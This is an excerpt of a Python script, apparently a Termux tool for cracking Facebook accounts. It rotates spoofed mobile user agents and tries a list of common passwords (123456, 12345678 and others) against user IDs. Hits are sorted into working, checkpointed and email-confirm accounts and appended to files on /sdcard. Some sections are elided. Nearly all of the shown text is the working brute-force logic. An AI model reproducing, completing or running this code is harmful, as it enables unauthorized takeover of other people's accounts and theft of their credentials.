...
def ua():
    uas = [
        "MUJAHID/5.0 (Linux; Android 13; SM-A146P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.134 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 12; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 11; RMX3191) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 12; CPH2185) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 11; Redmi Note 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.140 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 12; V2140) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.163 Mobile Safari/537.36",
        "MUJAHID/5.0 (Linux; Android 10; vivo 1901) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Mobile Safari/537.36",
        "MUJAHID/5.0 (iPhone; CPU iPhone OS 15_6_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6 Mobile/15E148 Safari/604.1"
    ]
...
def main():
    banner()
    os.system("xdg-open https://t.me/termux_python0011")
    user = []
    ...
    try:
        for pw in ["123456", "1234567", "12345678", "123456789", "123123"]:
            ...
            if "session_key" in response:
                print(f"\r{current_color}[EHC-OK-ID] {uid} • {pw} {current_emoji}")
                open("/sdcard/EMRAN-OK.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "www.facebook.com" in response.get("error_msg", ""):
                print(f"\r{A}[EHC-CP-ID] {uid} • {pw} {EMOJI_CP}")
                open("/sdcard/EMRAN-CP.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(response):
                print(f"\r{E}[EHC-MAIL-ID] {uid} • {pw} {EMOJI_MAIL}")
                open("/sdcard/EMRAN-MAIL.txt", "a").write(f"{uid}|{pw}\n")
                oks.append(uid)
                break

        loop += 1
        sys.stdout.write(f"\r{F}[EHC-EMRAN] Checked: {loop} | OK: {len(oks)} {EMOJI_CHECK}")
        sys.stdout.flush()
